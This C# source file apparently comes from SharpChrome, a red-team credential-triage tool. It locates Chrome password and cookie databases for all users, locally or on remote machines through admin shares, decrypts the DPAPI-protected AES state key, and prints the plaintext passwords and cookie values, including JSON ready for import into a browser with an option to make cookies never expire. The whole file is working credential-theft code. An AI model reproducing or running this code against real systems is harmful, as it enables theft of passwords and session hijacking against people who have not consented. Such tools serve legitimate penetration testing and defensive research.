using System;
using System.Management;
using System.Data;
using System.Security.Cryptography;
using System.IO;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Text;
using System.Text.RegularExpressions;
using SQLite;
using Microsoft.Win32;

namespace SharpChrome
{
    class Chrome
    {
        internal static byte[] DPAPI_HEADER = UTF8Encoding.UTF8.GetBytes("DPAPI");
        internal static byte[] DPAPI_CHROME_UNKV10 = UTF8Encoding.UTF8.GetBytes("v10");
        internal const int AES_BLOCK_SIZE = 16;

        // approach adapted from @djhohnstein's https://github.com/djhohnstein/SharpChrome/ project
        //  but using this CSHARP-SQLITE version https://github.com/akveo/digitsquare/tree/a251a1220ef6212d1bed8c720368435ee1bfdfc2/plugins/com.brodysoft.sqlitePlugin/src/wp
        public static void TriageChromeLogins(Dictionary<string, string> MasterKeys, string computerName = "", string displayFormat = "table", bool showAll = false, bool unprotect = false)
        {
            // triage all Chrome 'Login Data' files we can reach

            if (!String.IsNullOrEmpty(computerName))
            {
                // if we're triaging a remote computer, check connectivity first
                bool canAccess = SharpDPAPI.Helpers.TestRemote(computerName);
                if (!canAccess)
                {
                    return;
                }
            }

            if (SharpDPAPI.Helpers.IsHighIntegrity() || (!String.IsNullOrEmpty(computerName) && SharpDPAPI.Helpers.TestRemote(computerName)))
            {
                Console.WriteLine("[*] Triaging Chrome Logins for ALL users\r\n");

                string userFolder = "";
                if (!String.IsNullOrEmpty(computerName))
                {
                    userFolder = String.Format("\\\\{0}\\C$\\Users\\", computerName);
                }
                else
                {
                    userFolder = String.Format("{0}\\Users\\", Environment.GetEnvironmentVariable("SystemDrive"));
                }

                string[] dirs = Directory.GetDirectories(userFolder);

                foreach (string dir in dirs)
                {
                    if (!(dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users")))
                    {
                        string loginDataPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", dir);
                        var aesStateKeyPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", dir);

                        if (File.Exists(aesStateKeyPath))
                        {
                            // try to decrypt the new v80+ AES state file key, if it exists
                            byte[] aesStateKey = GetStateKey(MasterKeys, aesStateKeyPath, unprotect);

                            ParseChromeLogins(MasterKeys, loginDataPath, displayFormat, showAll, unprotect, aesStateKey);
                        }
                        else {
                            ParseChromeLogins(MasterKeys, loginDataPath, displayFormat, showAll, unprotect, null);
                        }
                    }
                }
            }
            else
            {
                // otherwise just triage the current user's credential folder
                Console.WriteLine("[*] Triaging Chrome Logins for current user\r\n");

                string loginDataPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", System.Environment.GetEnvironmentVariable("USERPROFILE"));
                var aesStateKeyPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", System.Environment.GetEnvironmentVariable("USERPROFILE"));

                if (File.Exists(aesStateKeyPath))
                {
                    // try to decrypt the new v80+ AES state file key, if it exists
                    byte[] aesStateKey = GetStateKey(MasterKeys, aesStateKeyPath, true); // force /unprotect
                    ParseChromeLogins(MasterKeys, loginDataPath, displayFormat, showAll, true, aesStateKey);
                }
                else
                {
                    ParseChromeLogins(MasterKeys, loginDataPath, displayFormat, showAll, true, null);
                }
            }
        }

        public static void TriageChromeCookies(Dictionary<string, string> MasterKeys, string computerName = "", string displayFormat = "csv", bool showAll = false, bool unprotect = false, string cookieRegex = "", string urlRegex = "", bool setneverexpire = false)
        {
            // triage all Chrome Cookies we can reach

            if (!String.IsNullOrEmpty(computerName))
            {
                // if we're triaging a remote computer, check connectivity first
                bool canAccess = SharpDPAPI.Helpers.TestRemote(computerName);
                if (!canAccess)
                {
                    return;
                }
            }

            if (SharpDPAPI.Helpers.IsHighIntegrity() || (!String.IsNullOrEmpty(computerName) && SharpDPAPI.Helpers.TestRemote(computerName)))
            {
                Console.WriteLine("[*] Triaging Chrome Cookies for ALL users\r\n");

                string userFolder = "";
                if (!String.IsNullOrEmpty(computerName))
                {
                    userFolder = String.Format("\\\\{0}\\C$\\Users\\", computerName);
                }
                else
                {
                    userFolder = String.Format("{0}\\Users\\", Environment.GetEnvironmentVariable("SystemDrive"));
                }

                string[] dirs = Directory.GetDirectories(userFolder);

                foreach (string dir in dirs)
                {
                    if (!(dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users")))
                    {
                        string cookiePath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies", dir);
                        var aesStateKeyPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", dir);

                        if (File.Exists(aesStateKeyPath))
                        {
                            // try to decrypt the new v80+ AES state file key, if it exists
                            byte[] aesStateKey = GetStateKey(MasterKeys, aesStateKeyPath, unprotect);

                            ParseChromeCookies(MasterKeys, cookiePath, displayFormat, showAll, unprotect, cookieRegex, urlRegex, setneverexpire, aesStateKey);
                        }
                        else
                        {
                            ParseChromeCookies(MasterKeys, cookiePath, displayFormat, showAll, unprotect, cookieRegex, urlRegex, setneverexpire, null);
                        }
                    }
                }
            }
            else
            {
                // otherwise just triage the current user's credential folder, so use CryptUnprotectData() by default
                Console.WriteLine("[*] Triaging Chrome Cookies for current user.\r\n");

                string cookiePath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies", System.Environment.GetEnvironmentVariable("USERPROFILE"));
                var aesStateKeyPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", System.Environment.GetEnvironmentVariable("USERPROFILE"));

                if (File.Exists(aesStateKeyPath))
                {
                    // try to decrypt the new v80+ AES state file key, if it exists
                    byte[] aesStateKey = GetStateKey(MasterKeys, aesStateKeyPath, true); // force /unprotect
                    ParseChromeCookies(MasterKeys, cookiePath, displayFormat, showAll, true, cookieRegex, urlRegex, setneverexpire, aesStateKey);
                }
                else
                {
                    ParseChromeCookies(MasterKeys, cookiePath, displayFormat, showAll, true, cookieRegex, urlRegex, setneverexpire, null);
                }
            }
        }

        public static void ParseChromeLogins(Dictionary<string, string> MasterKeys, string loginDataFilePath, string displayFormat = "table", bool showAll = false, bool unprotect = false, byte[] aesStateKey = null)
        {
            // takes an individual 'Login Data' file path and performs decryption/triage on it
            if (!File.Exists(loginDataFilePath))
            {
                return;
            }

            BCrypt.SafeAlgorithmHandle hAlg = null;
            BCrypt.SafeKeyHandle hKey = null;

            if (aesStateKey != null)
            {
                // initialize the BCrypt key using the new DPAPI decryption method
                DPAPIChromeAlgKeyFromRaw(aesStateKey, out hAlg, out hKey);
            }

            // convert to a file:/// uri path type so we can do lockless opening
            //  ref - https://github.com/gentilkiwi/mimikatz/pull/199
            var uri = new System.Uri(loginDataFilePath);
            string loginDataFilePathUri = String.Format("{0}?nolock=1", uri.AbsoluteUri);

            bool someResults = false;
            SQLiteConnection database = null;

            try
            {
                database = new SQLiteConnection(loginDataFilePathUri, SQLiteOpenFlags.ReadOnly | SQLiteOpenFlags.OpenUri, false);
            }
            catch (Exception e)
            {
                Console.WriteLine("[X] {0}", e.InnerException.Message);
                return;
            }

            if (!displayFormat.Equals("table") && !displayFormat.Equals("csv"))
            {
                Console.WriteLine("\r\n[X] Invalid format: {0}", displayFormat);
                return;
            }
            
            string query = "SELECT signon_realm, origin_url, username_value, password_value, times_used, cast(date_created as text) as date_created FROM logins";
            List<SQLiteQueryRow> results = database.Query2(query, false);

            foreach (SQLiteQueryRow row in results)
            {
                byte[] passwordBytes = (byte[])row.column[3].Value;
                byte[] decBytes = null;

                // decrypt the password bytes using masterkeys or CryptUnprotectData()

                if (HasV10Header(passwordBytes))
                {
                    if (aesStateKey != null)
                    {
                        // using the new DPAPI decryption method
                        decBytes = DecryptAESChromeBlob(passwordBytes, hAlg, hKey);

                        if (decBytes == null)
                        {
                            continue;
                        }
                    }
                    else
                    {
                        decBytes = Encoding.ASCII.GetBytes(String.Format("--AES STATE KEY NEEDED--"));
                    }
                }
                else {
                    // using the old method
                    decBytes = SharpDPAPI.Dpapi.DescribeDPAPIBlob(passwordBytes, MasterKeys, "chrome", unprotect);
                }

                string password = Encoding.ASCII.GetString(decBytes);

                DateTime dateCreated = SharpDPAPI.Helpers.ConvertToDateTime(row.column[5].Value.ToString());

                if ((password != String.Empty) || showAll)
                {
                    if (displayFormat.Equals("table"))
                    {
                        if (!someResults)
                        {
                            Console.WriteLine("\r\n--- Chrome Credential (Path: {0}) ---\r\n", loginDataFilePath);
                        }
                        someResults = true;
                        Console.WriteLine("URL       : {0} ({1})", row.column[0].Value, row.column[1].Value);
                        Console.WriteLine("Created   : {0}", dateCreated);
                        Console.WriteLine("TimesUsed : {0}", row.column[4].Value);
                        Console.WriteLine("Username  : {0}", row.column[2].Value);
                        Console.WriteLine("Password  : {0}", password);
                        Console.WriteLine();
                    }
                    else
                    {
                        if (!someResults)
                        {
                            Console.WriteLine("\r\n--- Chrome Credential (Path: {0}) ---\r\n", loginDataFilePath);
                            Console.WriteLine("file_path,signon_realm,origin_url,date_created,times_used,username,password");
                        }
                        someResults = true;

                        Console.WriteLine("{0},{1},{2},{3},{4},{5},{6}",
                            SharpDPAPI.Helpers.StringToCSVCell(loginDataFilePath),
                            SharpDPAPI.Helpers.StringToCSVCell(String.Format("{0}", row.column[0].Value)),
                            SharpDPAPI.Helpers.StringToCSVCell(String.Format("{0}", row.column[1].Value)),
                            SharpDPAPI.Helpers.StringToCSVCell(dateCreated.ToString()),
                            SharpDPAPI.Helpers.StringToCSVCell(String.Format("{0}", row.column[5].Value)),
                            SharpDPAPI.Helpers.StringToCSVCell(String.Format("{0}", row.column[2].Value)),
                            SharpDPAPI.Helpers.StringToCSVCell(password));
                    }
                }
            }
            database.Close();
        }

        public static void ParseChromeCookies(Dictionary<string, string> MasterKeys, string cookieFilePath, string displayFormat = "table", bool showAll = false, bool unprotect = false, string cookieRegex = "", string urlRegex = "", bool setneverexpire = false, byte[] aesStateKey = null)
        {
            // takes an individual Cookies file path and performs decryption/triage on it

            if (!File.Exists(cookieFilePath))
            {
                return;
            }

            BCrypt.SafeAlgorithmHandle hAlg = null;
            BCrypt.SafeKeyHandle hKey = null;

            if (aesStateKey != null)
            {
                // initialize the BCrypt key using the new DPAPI decryption method
                DPAPIChromeAlgKeyFromRaw(aesStateKey, out hAlg, out hKey);
            }

            // convert to a file:/// uri path type so we can do lockless opening
            //  ref - https://github.com/gentilkiwi/mimikatz/pull/199
            var uri = new System.Uri(cookieFilePath);
            string cookieFilePathUri = String.Format("{0}?nolock=1", uri.AbsoluteUri);

            bool someResults = false;
            SQLiteConnection database = null;

            if (!displayFormat.Equals("table") && !displayFormat.Equals("csv") && !displayFormat.Equals("json"))
            {
                Console.WriteLine("\r\n[X] Invalid format: {0}", displayFormat);
                return;
            }

            try
            {
                database = new SQLiteConnection(cookieFilePathUri, SQLiteOpenFlags.ReadOnly | SQLiteOpenFlags.OpenUri, false);
            }
            catch (Exception e)
            {
                Console.WriteLine("[X] {0}", e.InnerException.Message);
                return;
            }

            // old - fails in some cases due to partial indexing :(
            //string query = "SELECT cast(creation_utc as text) as creation_utc, host_key, name, path, cast(expires_utc as text) as expires_utc, is_secure, is_httponly, cast(last_access_utc as text) as last_access_utc, encrypted_value FROM cookies";
            
            // new, seems to work with partial indexing?? "/giphy table flip"
            string query = "SELECT cast(creation_utc as text) as creation_utc, host_key, name, path, cast(expires_utc as text) as expires_utc, cast(last_access_utc as text) as last_access_utc, encrypted_value FROM cookies";
            List<SQLiteQueryRow> results = database.Query2(query, false);
            int id = 1;

            // used if cookies "never expire" for json output
            DateTime epoch = new DateTime(1601, 1, 1);
            TimeSpan timespan = (DateTime.Now).AddYears(100) - epoch;
            long longExpiration = (long)Math.Abs(timespan.TotalSeconds * 1000000);

            foreach (SQLiteQueryRow row in results)
            {
                try
                {
                    byte[] decBytes = null;

                    // decrypt the encrypted cookie value with whatever data/method is specified
                    byte[] valueBytes = (byte[])row.column[6].Value;

                    if (HasV10Header(valueBytes))
                    {
                        if (aesStateKey != null)
                        {
                            // using the new DPAPI decryption method
                            decBytes = DecryptAESChromeBlob(valueBytes, hAlg, hKey);

                            if (decBytes == null)
                            {
                                continue;
                            }
                        }
                        else
                        {
                            decBytes = Encoding.ASCII.GetBytes(String.Format("AES State Key Needed"));
                        }
                    }
                    else
                    {
                        // using the old method
                        decBytes = SharpDPAPI.Dpapi.DescribeDPAPIBlob(valueBytes, MasterKeys, "chrome", unprotect);
                    }

                    string value = Encoding.ASCII.GetString(decBytes);

                    DateTime dateCreated = SharpDPAPI.Helpers.ConvertToDateTime(row.column[0].Value.ToString());
                    DateTime expires = SharpDPAPI.Helpers.ConvertToDateTime(row.column[4].Value.ToString());
                    DateTime lastAccess = SharpDPAPI.Helpers.ConvertToDateTime(row.column[5].Value.ToString());

                    // check conditions that will determine whether we're displaying this cookie entry
                    bool displayValue = false;
                    if (showAll)
                    {
                        displayValue = true;
                    }
                    else if (!String.IsNullOrEmpty(cookieRegex))
                    {
                        Match match = Regex.Match(row.column[2].Value.ToString(), cookieRegex, RegexOptions.IgnoreCase);
                        if (match.Success)
                        {
                            displayValue = true;
                        }
                    }
                    else if (!String.IsNullOrEmpty(urlRegex))
                    {
                        Match match = Regex.Match(row.column[1].Value.ToString(), urlRegex, RegexOptions.IgnoreCase);
                        if (match.Success)
                        {
                            displayValue = true;
                        }
                    }
                    else if (expires > DateTime.UtcNow)
                    {
                        displayValue = true;
                    }

                    if (displayValue)
                    {
                        if (displayFormat.Equals("table"))
                        {
                            if (!someResults)
                            {
                                Console.WriteLine("--- Chrome Cookies (Path: {0}) ---\r\n", cookieFilePath);
                            }
                            someResults = true;

                            Console.WriteLine("Host (path)                : {0} ({1})", row.column[1].Value, row.column[3].Value);
                            Console.WriteLine("Cookie Name                : {0}", row.column[2].Value);
                            Console.WriteLine("Cookie Value               : {0}", value);
                            Console.WriteLine("Created/Expires/LastAccess : {0} / {1} / {2}\r\n", dateCreated, expires, lastAccess);
                        }
                        else if (displayFormat.Equals("json"))
                        {
                            if (!someResults)
                            {
                                Console.WriteLine("--- Chrome Cookies (Path: {0}) ---\r\n", cookieFilePath);
                                Console.WriteLine("--- Chrome Cookies (Path: {0}) ---\r\n\r\nEditThisCookie import JSON:\r\n\r\n[\r\n{{\r\n", cookieFilePath);
                            }
                            else
                            {
                                Console.WriteLine("},\r\n{\r\n");
                            }
                            someResults = true;

                            Console.WriteLine("    \"domain\": \"{0}\",", SharpDPAPI.Helpers.CleanForJSON(String.Format("{0}", row.column[1].Value)));
                            if (setneverexpire)
                            {
                                Console.WriteLine("    \"expirationDate\": {0},", longExpiration);
                            }
                            else
                            {
                                Console.WriteLine("    \"expirationDate\": {0},", row.column[4].Value.ToString());
                            }
                            Console.WriteLine("    \"hostOnly\": false,");
                            Console.WriteLine("    \"httpOnly\": false,");
                            Console.WriteLine("    \"name\": \"{0}\",", SharpDPAPI.Helpers.CleanForJSON(String.Format("{0}", row.column[2].Value)));
                            Console.WriteLine("    \"path\": \"{0}\",", String.Format("{0}", row.column[3].Value));
                            Console.WriteLine("    \"sameSite\": \"no_restriction\",");
                            Console.WriteLine("    \"secure\": false,");
                            Console.WriteLine("    \"session\": false,");
                            Console.WriteLine("    \"storeId\": \"0\",");
                            Console.WriteLine("    \"value\": \"{0}\",", SharpDPAPI.Helpers.CleanForJSON(value));
                            Console.WriteLine("    \"id\": \"{0}\"", id);
                            id++;
                        }
                        else
                        {
                            // csv output
                            if (!someResults)
                            {
                                Console.WriteLine("--- Chrome Cookies (Path: {0}) ---\r\n", cookieFilePath);
                                Console.WriteLine("file_path,host,path,name,value,creation_utc,expires_utc,last_access_utc");
                            }
                            someResults = true;

                            Console.WriteLine("{0},{1},{2},{3},{4},{5},{6},{7}",
                                    SharpDPAPI.Helpers.StringToCSVCell(cookieFilePath),
                                    SharpDPAPI.Helpers.StringToCSVCell(String.Format("{0}", row.column[1].Value)),
                                    SharpDPAPI.Helpers.StringToCSVCell(String.Format("{0}", row.column[3].Value)),
                                    SharpDPAPI.Helpers.StringToCSVCell(String.Format("{0}", row.column[2].Value)),
                                    SharpDPAPI.Helpers.StringToCSVCell(value),
                                    SharpDPAPI.Helpers.StringToCSVCell(dateCreated.ToString()),
                                    SharpDPAPI.Helpers.StringToCSVCell(expires.ToString()),
                                    SharpDPAPI.Helpers.StringToCSVCell(lastAccess.ToString()));
                        }
                    }
                }
                catch { }
            }

            if (displayFormat.Equals("json") && someResults)
            {
                Console.WriteLine("}\r\n]\r\n");
            }

            database.Close();
        }

        // adapted from https://github.com/djhohnstein/SharpChrome/blob/e287334c0592abb02bf4f45ada23fecaa0052d48/ChromeCredentialManager.cs#L322-L344
        public static string GetBase64EncryptedKey(string localStatePath)
        {
            // extracts the base64 encoded encrypted chrome AES state key
            string localStateData = File.ReadAllText(localStatePath);
            string searchTerm = "encrypted_key";

            int startIndex = localStateData.IndexOf(searchTerm);

            if (startIndex < 0)
                return "";
            
            int keyIndex = startIndex + searchTerm.Length + 3;
            string tempVals = localStateData.Substring(keyIndex);

            int stopIndex = tempVals.IndexOf('"');
            if (stopIndex < 0)
                return "";

            string base64Key = tempVals.Substring(0, stopIndex);

            return base64Key;
        }

        // adapted from https://github.com/djhohnstein/SharpChrome/blob/e287334c0592abb02bf4f45ada23fecaa0052d48/ChromeCredentialManager.cs#L292-L308
        public static byte[] DecryptBase64StateKey(Dictionary<string, string> MasterKeys, string base64Key, bool unprotect)
        {
            byte[] encryptedKeyBytes = System.Convert.FromBase64String(base64Key);

            if((encryptedKeyBytes == null) || (encryptedKeyBytes.Length == 0))
            {
                return null;
            }

            if (SharpDPAPI.Helpers.ByteArrayEquals(DPAPI_HEADER, 0, encryptedKeyBytes, 0, 5))
            {
                byte[] encryptedKey = new byte[encryptedKeyBytes.Length - 5];
                Array.Copy(encryptedKeyBytes, 5, encryptedKey, 0, encryptedKeyBytes.Length - 5);

                if (unprotect)
                {
                    byte[] decryptedKey = ProtectedData.Unprotect(encryptedKey, null, DataProtectionScope.CurrentUser);
                    string decKey = BitConverter.ToString(decryptedKey);
                    return decryptedKey;
                }
                else
                {
                    // TODO: masterkey decryption
                    byte[] decryptedKey = SharpDPAPI.Dpapi.DescribeDPAPIBlob(encryptedKey, MasterKeys, "chrome", unprotect);
                    return decryptedKey;
                }
            }
            else
            {
                Console.WriteLine("[X] AES state key has unknown/non-DPAPI encoding.");
            }

            return null;
        }

        public static byte[] GetStateKey(Dictionary<string, string> MasterKeys, string localStatePath, bool unprotect)
        {
            // gets the base64 version of the encrypted state key
            //  and then decrypts it using either masterkeys or DPAPI functions

            string b64StateKey = GetBase64EncryptedKey(localStatePath);
            byte[] stateKey = DecryptBase64StateKey(MasterKeys, b64StateKey, unprotect);

            if (stateKey != null)
            {
                Console.WriteLine("\r\n\r\n[*] AES state key file : {0}", localStatePath);
                if (stateKey.Length == 32)
                {
                    Console.WriteLine("[*] AES state key      : {0}\r\n", BitConverter.ToString(stateKey).Replace("-", ""));
                }
                else
                {
                    Console.WriteLine("[*] AES state key      : {0}\r\n", Encoding.ASCII.GetString(stateKey));
                    return null;
                }
            }

            return stateKey;
        }

        //public static bool UseNewDPAPIScheme(string computerName = "localhost")
        //{
        //    // uses WMI's StdRegProv to retrieve the location of chrome.exe from the registry (local or remote)
        //    //  then grabs the file version of chrome.exe to determine if the new v80+ DPAPI scheme is needed
        //    try
        //    {
        //        ConnectionOptions connection = new ConnectionOptions();
        //        connection.Impersonation = System.Management.ImpersonationLevel.Impersonate;
        //        ManagementScope scope = new ManagementScope($"\\\\{computerName}\\root\\default", connection);
        //        scope.Connect();

        //        ManagementClass registry = new ManagementClass(scope, new ManagementPath("StdRegProv"), null);

        //        ManagementBaseObject inParams = registry.GetMethodParameters("GetStringValue");
        //        inParams["hDefKey"] = 2147483650; // HKLM
        //        inParams["sSubKeyName"] = @"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe";
        //        inParams["sValueName"] = "";

        //        ManagementBaseObject outParams = registry.InvokeMethod("GetStringValue", inParams, null);
        //        string chromePath = (string)outParams["sValue"];

        //        if (computerName != "localhost")
        //        {
        //            chromePath = SharpDPAPI.Helpers.ConvertLocalPathToUNCPath(computerName, chromePath);
        //        }

        //        var chromeVersion = new Version(FileVersionInfo.GetVersionInfo(chromePath).ProductVersion);

        //        if (chromeVersion.Major >= 80)
        //        {
        //            return true;
        //        }
        //    }
        //    catch { }

        //    return false;
        //}

        //kuhl_m_dpapi_chrome_alg_key_from_raw
        // adapted from https://github.com/djhohnstein/SharpChrome/blob/e287334c0592abb02bf4f45ada23fecaa0052d48/ChromeCredentialManager.cs#L352-L371
        public static bool DPAPIChromeAlgKeyFromRaw(byte[] key, out BCrypt.SafeAlgorithmHandle hAlg, out BCrypt.SafeKeyHandle hKey)
        {
            bool bRet = false;
            hAlg = null;
            hKey = null;

            uint ntStatus = BCrypt.BCryptOpenAlgorithmProvider(out hAlg, "AES", null, 0);
            if (ntStatus == 0)
            {
                ntStatus = BCrypt.BCryptSetProperty(hAlg, "ChainingMode", "ChainingModeGCM", 0);
                if (ntStatus == 0)
                {
                    ntStatus = BCrypt.BCryptGenerateSymmetricKey(hAlg, out hKey, null, 0, key, key.Length, 0);
                    if (ntStatus == 0)
                        bRet = true;
                }
            }
            return bRet;
        }

        // adapted from https://github.com/djhohnstein/SharpChrome/blob/e287334c0592abb02bf4f45ada23fecaa0052d48/ChromeCredentialManager.cs#L136-L197
        // god bless you Dwight for figuring this out lol
        public static byte[] DecryptAESChromeBlob(byte[] dwData, BCrypt.SafeAlgorithmHandle hAlg, BCrypt.SafeKeyHandle hKey)
        {
            // magic decryption happens here

            byte[] dwDataOut = null;
            BCrypt.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info;
            int dwDataOutLen;
            IntPtr pData = IntPtr.Zero;
            uint ntStatus;
            byte[] subArrayNoV10;
            int pcbResult = 0;

            unsafe
            {
                if (SharpDPAPI.Helpers.ByteArrayEquals(dwData, 0, DPAPI_CHROME_UNKV10, 0, 3))
                {
                    subArrayNoV10 = new byte[dwData.Length - DPAPI_CHROME_UNKV10.Length];
                    Array.Copy(dwData, 3, subArrayNoV10, 0, dwData.Length - DPAPI_CHROME_UNKV10.Length);
                    pData = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(byte)) * dwData.Length);

                    try
                    {
                        Marshal.Copy(dwData, 0, pData, dwData.Length);
                        BCrypt.BCRYPT_INIT_AUTH_MODE_INFO(out info);
                        info.pbNonce = (byte*)(new IntPtr(pData.ToInt64() + DPAPI_CHROME_UNKV10.Length));
                        info.cbNonce = 12;
                        info.pbTag = info.pbNonce + dwData.Length - (DPAPI_CHROME_UNKV10.Length + AES_BLOCK_SIZE); // AES_BLOCK_SIZE = 16
                        info.cbTag = AES_BLOCK_SIZE; // AES_BLOCK_SIZE = 16
                        dwDataOutLen = dwData.Length - DPAPI_CHROME_UNKV10.Length - info.cbNonce - info.cbTag;
                        dwDataOut = new byte[dwDataOutLen];

                        fixed (byte* pDataOut = dwDataOut)
                        {
                            ntStatus = BCrypt.BCryptDecrypt(hKey, info.pbNonce + info.cbNonce, dwDataOutLen, (void*)&info, null, 0, pDataOut, dwDataOutLen, out pcbResult, 0);
                        }

                        if (ntStatus != 0)
                        {
                            Console.WriteLine("[X] Error : {0}", ntStatus);
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("Exception : {0}", ex.Message);
                    }
                    finally
                    {
                        if (pData != null && pData != IntPtr.Zero)
                            Marshal.FreeHGlobal(pData);
                    }
                }
                else
                {
                    Console.WriteLine("[X] Data header not equal to DPAPI_CHROME_UNKV10");
                }
            }
            return dwDataOut;
        }

        public static bool HasV10Header(byte[] data)
        {
            return SharpDPAPI.Helpers.ByteArrayEquals(data, 0, DPAPI_CHROME_UNKV10, 0, 3);
        }
    }
}
